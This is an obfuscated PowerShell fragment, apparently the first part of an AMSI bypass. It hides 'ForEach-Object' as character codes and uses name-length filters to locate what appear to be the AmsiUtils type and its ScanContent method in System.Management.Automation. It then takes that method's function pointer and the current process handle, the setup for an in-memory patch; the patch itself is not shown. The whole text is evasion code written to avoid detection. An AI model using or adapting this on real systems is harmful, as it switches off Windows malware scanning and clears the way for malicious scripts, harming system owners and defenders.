$eIav = [appdomain]::currentdomain.getassemblies()
$eIav |
  & ([string]::join('', ( (70,111,114,69,97,99,104,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) {
    if($_.Location -ne $null){
         $y = $_.FullName.Split(",")[0]
         If($y.StartsWith('S') -And $y.EndsWith('n') -And $y.Length -eq 28) {
                 $9X3 = $_.GetTypes()
         }
    }
}

$9X3 |
  & ([string]::join('', ( (70,111,114,69,97,99,104,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) {
    if($_.Name -ne $null){
         If($_.Name.StartsWith('A') -And $_.Name.EndsWith('s') -And $_.Name.Length -eq 9) {
                 $zZgSyhcnK9ejdM = $_.GetMethods([System.Reflection.BindingFlags]'Static,NonPublic')
         }
    }
}

$zZgSyhcnK9ejdM |
  & ([string]::join('', ( (70,111,114,69,97,99,104,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) {
    if($_.Name -ne $null){
         If($_.Name.StartsWith('S') -And $_.Name.EndsWith('t') -And $_.Name.Length -eq 11) {
                 $MdySY3DAxkizWV6eKLJ2u = $_
         }
    }
}

[IntPtr] $KyxpqEV93Znd = $MdySY3DAxkizWV6eKLJ2u.MethodHandle.GetFunctionPointer()
[IntPtr] $Mp2fPIj05mA = [APIs]::GetCurrentProcess()
$XsplXHxDwe0mXoDsL1g8N1V8 = 0
$jq8f = $false

